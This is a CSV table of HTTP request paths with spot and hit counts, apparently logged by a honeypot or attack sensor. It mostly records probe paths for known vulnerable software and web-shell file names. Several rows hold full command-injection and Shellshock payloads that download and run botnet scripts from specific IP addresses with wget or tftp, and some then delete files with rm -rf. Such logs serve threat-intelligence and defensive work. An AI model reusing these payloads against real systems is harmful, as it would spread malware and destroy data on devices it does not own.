Signature,Spots,Hits
/goform/setUsbUnload/.js,22,1117
/pages/createpage-entervariables.action,22,458
/backupmgt/localJob.php,22,281
/v1.40/containers/create,22,256
/,21,203
/include/makecvs.php,21,95
/_config/query_servers/cmd,21,79
/body.txt,21,27
/console/css/%252e%252e%252fconsole.portal,20,60
/tools.cgi,20,41
/checkValid,19,592
/console/css/%252e%252e/consolejndi.portal,19,42
/cgibin/mainfunction.cgi&action=login&keyPath=wget+https%3A%2F%2Fiplogger.org/2EULU5&loginUser=a&loginPwd=a,19,19
/cgibin/mainfunction.cgi&action=login&keyPath=wget+http%3A%2F%2F136.144.41.3%2Fdaytreckcndjknckd%2Fohsitsvegawellrip.sh+%3B+chmod+777+ohsitsvegawellrip.sh+%3B+sh+ohsitsvegawellrip.sh%3Bwget+https%3A%2F%2Fiplogger.org%2F2FGVP5&loginUser=a&loginPwd=a,19,19
/pages/doenterpagevariables.action,18,3428
/run,18,603
/console/css/%252e%252e%252fconsolejndi.portal,17,169
/guest_auth/guestIsUp.php,17,91
/zhnping.cmd,17,33
/live/CPEManager/AXCampaignManager/delete_cpes_by_ids,16,43
/goform/SystemCommand,16,42
/v1.26/containers/create,16,33
/cgibin/mainfunction.cgi&action=login&keyPath=wget+https%3A%2F%2F2no.co/2EULU5&loginUser=a&loginPwd=a,16,16
/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,15,177
/editBlackAndWhiteList,15,132
/AdminService/urest/v1/LogonResource,15,40
/getclock,15,22
/dnslookup.cgi,15,15
/core/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,14,164
/storfs-asup,14,121
/check_browser,14,22
/q,13,110
/GponForm/diag_Form,13,37
/api/getServices,13,35
/users,12,64
/formWlanSetup.htm,11,20
/goform/setSysAdm,10,151
/struts2-rest-showcase/orders/3,10,148
/shellcd%20/tmp%20%7C%7C%20cd%20/run%20%7C%7C%20cd%20/;%20wget%20http://107.175.194.3/daqwbins.sh;%20chmod%20777%20daqwbins.sh;%20sh%20daqwbins.sh;%20tftp%20107.175.194.3%20-c%20get%20daqwtftp1.sh;%20chmod%20777%20daqwtftp1.sh;%20sh%20daqwtftp1.sh;%20tftp%20-r%20daqwtftp2.sh%20-g%20107.175.194.3;%20chmod%20777%20daqwtftp2.sh;%20sh%20daqwtftp2.sh;%20rm%20-rf%20daqwbins.sh%20daqwtftp1.sh%20daqwtftp2.sh;%20rm%20-rf%20*,10,26
/login,10,18
//uapi-cgi/certmngr.cgi,9,118
/wsman,9,22
/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp,9,13
/login.htm,8,157
/cgi/networkDiag.cgi,8,147
/assets/php/upload.php,8,140
/search.php,8,139
/sys_config_valid.xgi,8,42
/service/extdirect,8,17
/apply.cgi,8,12
/graph_realtime.php,7,146
/mgmt/tm/util/bash,7,11
/orders/3,6,143
/jbossass/jbossass.jsp,6,43
/tos/index.php,6,8
/8UsA1.sh,6,8
/rest/tinymce/1/macro/preview,6,6
/goform/setmac,5,142
/cn/cmd,5,23
/cgi,5,9
/shell&cd%20%2Ftmp%3B%20wget%20http%3A%2F%2F195.133.40.24%2FS1eJ3%2FIObeENwjarm%20-O%20IObeENwjarm%3B%20chmod%20755%20IObeENwjarm%3B%20.%2FIObeENwjarm%3B%20rm%20-f%20IObeENwjarm,5,6
/chkisg.htm%3FSip%3D1.1.1.1%20%7C%20wget%20http%3A//176.32.34.111%3A24791/dlink%20-O%20test,5,5
/cgibin/mainfunction.cgi&action=login&keyPath=wget+http%3A%2F%2F51.222.56.159%2Fsh+%3B+chmod+777+sh+%3B+sh+sh&loginUser=a&loginPwd=a,5,5
/shell%20,5,5
/shell%00,5,5
/var,4,136
/solr/%7B%7Bcore%7D%7D/select,4,136
/solr/%7B%7Bcore%7D%7D/dataimport,4,130
/upload,4,122
/nrdh.php,4,17
/wls-wsat/RegistrationPortTypeRPC,4,14
/new-index.php,4,14
/wikindex.php,4,14
/baindex.php,4,14
/zindex.php,4,14
/v1.23/containers/create,4,12
/_search,4,10
/op_type=ping&destination=cd%20/tmp;%20wget%20http://iotlmao.xyz/lolol.sh;%20chmod%20777%20lolol.sh;%20sh%20lolol.sh,4,7
/boardDataWW.php,4,7
/cgi-bin-igd/netcore_get.cgi,4,6
/cgibin/mainfunction.cgi&action=login&keyPath=wget+http%3A%2F%2F108.174.62.168%2FHilix.sh+%3B+chmod+777+Hilix.sh+%3B+sh+Hilix.sh&loginUser=a&loginPwd=a,4,5
/_cat/indices,4,4
/include/exportUser.php,4,4
//console/css/%252e%252e%252fconsolejndi.portal,3,29
/druid/indexer/v1/sampler,3,5
/password_change.cgi,3,4
/sntpcfg.cgi,3,3
/secure/ContactAdministrators.jspa,3,3
/restapps/applications.php,3,3
/v1.37/containers/create,3,3
/struts2-showcase/index.action,3,3
/v1.39/containers/create,3,3
/fuel/pages/select/,3,3
/pandora_console/index.php,2,37
/_async/AsyncResponseService,2,26
/raidh.php,2,8
/nette.micro,2,3
/en/php/usb_sync.php,2,3
/op_type=ping&destination=cd%20/tmp;%20wget%20http://45.133.1.133/lolol.sh;%20chmod%20777%20lolol.sh;%20sh%20lolol.sh,2,2
/cgibin/mainfunction.cgi&action=login&keyPath=wget+https%3A%2F%2Fiplogger.org/2EULU5%2F&loginUser=a&loginPwd=a,2,2
/str/showcase.action,2,2
/goform/formSysCmd,2,2
/gbr.php,2,2
/admin/cms/login.action,2,2
/portal/home.jsp,2,2
/system/sharedir.php,2,2
/auth/change,2,2
/auth,2,2
/ping.cgi,1,5405
/recordings/dmc.php,1,9
/recordings/main.php,1,9
/main.php,1,9
/recordings/mcd.php,1,9
/panel/main.php,1,9
/recordings/cmd.php,1,9
/actions/authenticate.php,1,6
/javax.faces.resource/dynamiccontent.properties.xhtml,1,6
/restapi/config.all.php,1,6
/welcome/config.all.php,1,6
/meetme/config.all.php,1,6
/restapps/config.all.php,1,6
/maint/config.all.php,1,6
/themes/config.all.php,1,6
/xx.php,1,6
/config/config.all.php,1,6
/recordingsconfig.all.php,1,6
/css/config.all.php,1,6
/admin/libraries/config.all.php,1,6
/asteriskWS/config.all.php,1,6
/recordings/misc/config.all.php,1,6
/admin/views/config.all.php,1,6
/user/config.all.php,1,6
/admin/modules/cxpanel/config.all.php,1,6
/bin/config.all.php,1,6
/admin/themes/config.all.php,1,6
/nwebmail/config.all.php,1,6
/recordings/.3305b4a4dacef87aefc095a8dda66a8a.php,1,6
/recordings.old/config.all.php,1,6
/config.all.php,1,6
/api.php,1,6
/panel/config.all.php,1,6
/panel/dhtml/config.all.php,1,6
/widgets/config.all.php,1,6
/recordings/locale/bg_BG/LC_MESSAGES/config.all.php,1,6
/recordings/modules/config.all.php,1,6
/phpversions.php,1,6
/components/config.all.php,1,6
/adminconfig.all.php,1,6
/tests/config.all.php,1,6
/libs/config.all.php,1,6
/admin/images/config.all.php,1,6
/_asterisk/index.php,1,6
/admin/common/config.all.php,1,6
/help/config.all.php,1,6
/framework/config.all.php,1,6
/recordings/theme/config.all.php,1,6
/aastra/config.all.php,1,6
/admin/helpers/config.all.php,1,6
/recordings/lol.php,1,6
/STC_VoIP_PIN/config.all.php,1,6
/a2billing/common/lib/jpgraph_lib/config.all.php,1,6
/controllers/config.all.php,1,6
/vtigercrm/z.php,1,6
/admin/.3305b4a4dacef87aefc095a8dda66a8a.php,1,6
/vtigercrm/phpversions.php,1,6
/admin/cdr/config.all.php,1,6
/recordings/config.all.php,1,6
/admin/modules/config.all.php,1,6
/recordings/.tika.php,1,6
/panel/init/config.all.php,1,6
/mail/config.all.php,1,6
/images/config.all.php,1,6
/include/config.all.php,1,6
/a2billing/common/images/config.all.php,1,6
/_asterisk/a7a.php,1,6
/recordings/miscconfig.all.php,1,6
/var/config.all.php,1,6
/panel/ming-source/config.all.php,1,6
/graph.php,1,6
/recordings/graph.php,1,6
/recordings/page.framework.php,1,6
/recordings/phpversions.php,1,6
/vtigercrm/graph.php,1,6
/templates_c/config.all.php,1,6
/a2billing/common/lib/pqp/config.all.php,1,6
/_asterisk/config.all.php,1,6
/recordings/locale/config.all.php,1,6
/temp/config.all.php,1,6
/_asterisk/MeSSi.php,1,6
/cisco/config.all.php,1,6
/admin/i18n/config.all.php,1,6
/panel/flash/config.all.php,1,6
/admin/assets/config.all.php,1,6
/admin/modules/ucp/htdocs/config.all.php,1,6
/recordings/s.php,1,6
/k12/config.all.php,1,6
/.3305b4a4dacef87aefc095a8dda66a8a.php,1,6
/vtigercrm/ml.php,1,6
/web-meetme/config.all.php,1,6
/admin/config.all.php,1,6
/a2billing/common/javascript/config.all.php,1,6
/recordings/includes/config.all.php,1,6
/a2billing/config.all.php,1,6
/recordings/locale/bg_BG/config.all.php,1,6
/lang/config.all.php,1,6
/favicon.ico,1,6
/elastixConnection/config.all.php,1,5
/modules/config.all.php,1,5
/classes/config.all.php,1,5
/mobrise/config.all.php,1,5
/js/config.all.php,1,5
/configs/config.all.php,1,5
/digium_phones/config.all.php,1,5
/xmlservices/config.all.php,1,5
/yii/config.all.php,1,5
/vtigercrm/config.all.php,1,5
/api/jsonws/invoke,1,4
/login.cgi.php,1,3
/var/tika.php,1,3
/vtigercrm/saky.php,1,3
/recordings/Ultimatex.php,1,3
/recordings/Hima.php,1,3
/ssh.php,1,3
/vtigercrm/xml.php,1,3
/test.php,1,3
/vtigercrm/Himaa.php,1,3
/recordings/ops.php,1,3
/wav.php,1,3
/vtigercrm/a7a.php,1,3
/recordings/emad-shell.php,1,3
/vtigercrm/3Zz.php,1,3
/recordings/play_page.php,1,3
/recordings/emad.php,1,3
/recordings/scan.php,1,3
/panel/main.php.1,1,3
/falx.php,1,3
/admin/xml.php,1,3
/recordings/info.php,1,3
/vtigercrm/phprint.php,1,3
/recordings/m2s.php,1,3
/emad.php,1,3
/vtigercrm/zizo.php,1,3
/main.php.2,1,3
/vtigercrm/xXx-ELMAYET-xXx.php,1,3
/recordings/too.php,1,3
/vtigercrm/AboSala7.php,1,3
/recordings/11.php,1,3
/recordings/a7a.php,1,3
/Z3R0-C00L.php,1,3
/recordings/misc/thaer.php,1,3
/zz.php.call,1,3
/recordings/theme/config.inc.php,1,3
/recordings/pow.php,1,3
/recordings/a/config.php,1,3
/recordings/ec0ed5d0ec037dca5.php,1,3
/_asterisk/tika.php,1,3
/recordings/ELMAYET/config.php,1,3
/system.php,1,3
/recordings/b374k-2.8.php,1,3
/recordings/webadmin.php,1,3
/recordings/misc/,1,3
/recordings/atmin/config.php,1,3
/panel/main.php.2,1,3
/_asterisk/sos.php,1,3
/assets/Xiii.php,1,3
/main.php.1,1,3
/0x4148.php.call,1,3
/admin/fortest.php,1,3
/recordings/3Zz.php,1,3
/recordings/theme/new.php,1,3
/vtigercrm/Hima.php,1,3
/vtigercrm/main.php,1,3
/recordings/m7mood/config.php,1,3
/vtigercrm/xXx-mat.php,1,3
/a2billing/ws.php,1,3
/recordings/badr2.php,1,3
/vamp.php,1,3
/recordings/Go.php,1,3
/_asterisk/Xiii.php,1,3
/recordings/sall123.php,1,3
/Hima.php,1,3
/recordings/awael/config.php,1,3
/recordings/theme/load.php,1,3
/vtigercrm/ops.php,1,3
/x1.php,1,3
/pew.php,1,3
/panel/atmin/config.php,1,3
/recordings/Dead_Sec_Team/config.php,1,3
/recordings/main.php.1,1,3
/recordings/Xiii.php,1,3
/vtigercrm/moaz.php,1,3
/recordings/a8a.php,1,3
/Z3R0-C00l.php.call,1,3
/11.php,1,3
/var/mod_conf.php,1,3
/dslvl.php,1,3
/recordings/is/config.php,1,3
/recordings/xnxx/config.php,1,3
/webadmin.php,1,3
/recordings/Hima_s.php,1,3
/recordings/a7/config.php,1,3
/z.php,1,3
/Ahmed01126291919.php,1,3
/admin/assets/Xiii.php,1,3
/recordings/misc/callme_page.php,1,3
/vtigercrm/k4ijo.php,1,3
/admin/modules/admindashboard/phpsysinfo/1.php,1,3
/recordings/em7e/config.php,1,3
/recordings/jeep.php,1,3
/recordings/just-emad.php,1,3
/vtigercrm/Go.php,1,3
/x.php,1,3
/admin/bootstrap.inc.php,1,3
/panel/webadmin.php,1,3
/_asterisk/253582e2ec168f76c0d4755668192ea4fdad110fe4dee9.php,1,3
/445122A555.php,1,3
/recordings/ini.php,1,3
/var/config.php,1,3
/admin/config.php,1,3
/admin/modules/backup/page.backup.php,1,3
/recordings/shell-test.php,1,3
/_asterisk/V-E-M.php,1,3
/dispatch.php,1,3
/recordings/azoofo.php,1,3
/admin/modules/admindashboard/phpsysinfo/common_admin_functions.php,1,3
/vtigercrm/11.php,1,3
/sip.txt,1,3
/panel/fortest.php,1,3
/recordings/config.amportal.php,1,3
/admin/modules/admindashboard/phpsysinfo/ass.php,1,3
/xml.php,1,3
/atmin/config.php,1,3
/recordings/SecureShell.php,1,3
/recordings/ELLYAAS/config.php,1,3
/recordings/mo/config.php,1,3
/recordings/pos.php,1,3
/v1/agent/service/register,1,2
//vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,1,2
/edit/server/,1,2
/tmui/login.jsp/..;/tmui/locallib/workplace/tmshCmd.jsp,1,2
/ajax/networking/get_netcfg.php,1,2
/recordings/main.php.2,1,2
/bin/bash%20-c%20%22rm%20-rf%20/tmp/*;echo%20wget%20http://205.185.122.121/China%22,1,2
/pingcmd.cmd,1,1
/op_type=ping&destination=cd%20/tmp;%20wget%20http://37.46.150.102/lolol.sh;%20chmod%20777%20lolol.sh;%20sh%20lolol.sh,1,1
HTTP/1.1,1,1
/vpns/portal/scripts/newbm.pl,1,1
/op_type=ping&destination=cd%20/tmp;%20wget%20http://185.239.242.63/lolol.sh;%20chmod%20777%20lolol.sh;%20sh%20lolol.sh,1,1
/index.php,1,1
/shell%3Fcd%20%2Ftmp%3B%20echo%20%3ENiGGea%20%7C%7C%20cd%20%2Fvar%3B%20echo%20%3ENiGGea%3B%20cp%20%2Fbin%2Fbusybox%20yee%3B%20%3Eyee%3B%20chmod%20777%20yee%3B%20nohup%20wget%20http%3A%2F%5C%2F87.121.98.34%3A80%2Fillz%2Fmegumi.arm7%20-O%20yee%20%7C%7C%20nohup%20tftp%20-r%20megumi.arm7%20-g%2087.121.98.34%3A80%20-l%20yee%3B%20chmod%20777%20yee%3B.%2Fyee%3B%20rm%20-rf%20yeeter%20%3E%2Fdev%2Fnull%202%3E%261,1,1
/shell%3Fcd%20%2Ftmp%3B%20echo%20%3ENiGGea%20%7C%7C%20cd%20%2Fvar%3B%20echo%20%3ENiGGea%3B%20cp%20%2Fbin%2Fbusybox%20yee%3B%20%3Eyee%3B%20chmod%20777%20yee%3B%20nohup%20wget%20http%3A%2F%5C%2F87.121.98.34%3A80%2Fillz%2Fmegumi.arm4%20-O%20yee%20%7C%7C%20nohup%20tftp%20-r%20megumi.arm4%20-g%2087.121.98.34%3A80%20-l%20yee%3B%20chmod%20777%20yee%3B.%2Fyee%3B%20rm%20-rf%20yeeter%20%3E%2Fdev%2Fnull%202%3E%261,1,1
/v1.38/containers/create,1,1
/_config/query_servers/afhh,1,1
/incl/image_test.shtml,1,1
/cgibin/mainfunction.cgi&action=login&keyPath=wget+http%3A%2F%2F108.174.62.168%2Fsnype.sh+%3B+chmod+777+snype.sh+%3B+sh+snype.sh&loginUser=a&loginPwd=a,1,1
/system,1,1
/setup.cgi%3Fnext_file%3Dnetgear.cfg%26todo%3Dsyscmd%26cmd%3Drm+-rf+%2Ftmp%2F*%3Bwget+http%3A%2F%2F107.172.249.3%2Fbins%2Fsora.mips+-O+%2Ftmp%2Fnetgear%3Bsh+netgear%26curpath%3D%2F%26currentsetting.htm%3D1,1,1
/service/v1/createUser,1,1
/v1.35/containers/create,1,1
/goform/formWsc,1,1
/_config/query_servers/hvkfnjff,1,1
/_config/query_servers/hqatiuy,1,1
/cgibin/mainfunction.cgi&action=login&keyPath=cd%20/tmp;%20wget%20http://103.133.111.238/draytek%20-O%20.draytek;%20chmod%20+x%20.draytek;%20sh%20.draytek;%20rm%20-rf%20.draytek&loginUser=a&loginPwd=a,1,1
/gbrgbr.php,1,1
/cgibin/mainfunction.cgi&action=login&keyPath=cd%20/tmp;%20wget%20http://103.133.111.238/anon%20-O%20.anon;%20chmod%20+x%20.anon;%20sh%20.anon;%20rm%20-rf%20.anon&loginUser=a&loginPwd=a,1,1
/.wgetrc,1,1
/console/framework/skins/wlsconsole/images/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fconsole.portal,1,1
/images/..%2Fapply_abstract.cgi,1,1
/cd%20/tmp%20%7C%7C%20cd%20/run%20%7C%7C%20cd%20/;%20wget%20http://107.173.181.13/Intg420bins.sh;%20chmod%20777%20Intg420bins.sh;%20sh%20Intg420bins.sh;%20tftp%20107.173.181.13%20-c%20get%20Intg420tftp1.sh;%20chmod%20777%20Intg420tftp1.sh;%20sh%20Intg420tftp1.sh;%20tftp%20-r%20Intg420tftp2.sh%20-g%20107.173.181.13;%20chmod%20777%20Intg420tftp2.sh;%20sh%20Intg420tftp2.sh;%20rm%20-rf%20Intg420bins.sh%20Intg420tftp1.sh%20Intg420tftp2.sh;%20rm%20-rf%20*,1,1
/GET%20/%20HTTP/1.1%20Host:%203.7.80.171%20Referer:%20()%20%7B%20:;%20%7D;%20/bin/bash%20-c%20%22rm%20-rf%20/tmp/*;echo%20wget%20http://205.185.122.121/China.Z%20-O%20/tmp/China.Z-rcja%20%3E%3E%20/tmp/Run.sh;echo%20echo%20By%20China.Z%20%3E%3E%20/tmp/Run.sh;echo%20chmod%20777%20/tmp/China.Z-rcja%20%3E%3E%20/tmp/Run.sh;echo%20/tmp/China.Z-rcja%20%3E%3E%20/tmp/Run.sh;echo%20rm%20-rf%20/tmp/Run.sh%20%3E%3E%20/tmp/Run.sh;chmod%20777%20/tmp/Run.sh;/tmp/Run.sh%22%20Accept:*/*%20User-Agent:%20()%20%7B%20:;%20%7D;%20/bin/bash%20-c%20%22rm%20-rf%20/tmp/*;echo%20wget%20http://205.185.122.121/China.Z%20-O%20/tmp/China.Z-rcja%20%3E%3E%20/tmp/Run.sh;echo%20echo%20By%20China.Z%20%3E%3E%20/tmp/Run.sh;echo%20chmod%20777%20/tmp/China.Z-rcja%20%3E%3E%20/tmp/Run.sh;echo%20/tmp/China.Z-rcja%20%3E%3E%20/tmp/Run.sh;echo%20rm%20-rf%20/tmp/Run.sh%20%3E%3E%20/tmp/Run.sh;chmod%20777%20/tmp/Run.sh;/tmp/Run.sh%22%20Connection:Keep-Alive,1,1
/QNAP_helpdesk.cgi,1,1
